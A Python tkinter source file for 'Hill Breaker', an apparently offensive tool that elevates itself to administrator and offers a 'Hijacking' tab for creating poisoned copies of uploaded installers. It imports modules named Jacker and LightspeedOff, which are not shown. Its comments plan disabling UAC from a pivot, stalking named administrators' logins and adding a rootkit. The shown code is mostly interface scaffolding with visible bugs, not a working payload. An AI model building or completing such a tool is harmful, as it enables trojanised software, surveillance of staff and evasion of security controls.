#This is probably the worst python/tkinter code ever written. I hate UI code(and its probably not its fault).
import tkinter
from tkinter import messagebox, Frame, ttk, LabelFrame, Label, Button, filedialog #.ttk and tkinter widgets are diffrent, headache
import loggermain, Jacker, LightspeedOff
from ctypes import windll
from sys import executable, argv
from os import getlogin

c = (windll.shell32)
installer = ""

windll.shcore.SetProcessDpiAwareness(1) #Blurry fonts - https://stackoverflow.com/questions/41315873

def Upload():
    installer = filedialog.askopenfilename()
    selected.config(text=installer)

def Elevate():
    c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
    if c.IsUserAnAdmin():
        quit() # After new elevated script is running, Keep Yourself Safe #03
    else:
        messagebox.showerror(title='Hill Breaker', message='Failed to elevate program.')

root = tkinter.Tk()
root.title("Hill Breaker")

#Tabs
tab = ttk.Notebook(root)

home = Frame(tab,padx=10,pady=10,bg='#999999')
hijacking = Frame(tab,padx=10,pady=10,bg='#999999')
controls = Frame(tab,padx=10,pady=10,bg='#999999')

tab.add(home, text='Home')
tab.add(hijacking, text='Hijacking')
tab.add(controls, text='Controls')

tab.pack(expand=1, fill='both')

#Home
admin = LabelFrame(home,text="Elevation Status",padx=10,pady=10,bg='#888888',borderwidth=5)
status = Label(admin,text="Program is not currently elevated.",bg='#888888').pack(anchor='nw')
elevate = Button(admin,text="Elevate",command=lambda : Elevate(),borderwidth=5)
if c.IsUserAnAdmin(): # Can probably do this all with a text variable and returns and blah blah
    status.config(text="Program is running as elevated under " + getlogin()) # Probably better to just not do this in python
    elevate.config(disabled=1)
admin.pack(anchor='nw')



#Hijacker - Create fake installers, etc
uploader = LabelFrame(hijacking,text="Create Installer",padx=10,pady=10,bg='#888888',borderwidth=5)
info = Label(uploader,text="Upload installer file to create poisoned copy.",bg='#888888')
poisonOptions = LabelFrame(hijacking,text="Options",padx=10,pady=10,bg='#888888',borderwidth=5)
selected = Label(poisonOptions,text=("No file selected."),bg='#888888')
uploadfile = Button(uploader,text="Upload file",command=lambda : Upload(),borderwidth=5)

info.pack(anchor='nw')
elevate.pack(anchor='nw')          
uploadfile.pack(anchor='nw')
uploader.pack(anchor='nw')
selected.pack(anchor='nw')
poisonOptions.pack(anchor='nw')

#Controller - Control local system, disable UAC, etc. from a pivot

#Stalker - "stalk" admins and admin logs, i.e "tdoyle has logged in at __" "cevans has done __"

#Roots - Rootkit when?

root.mainloop()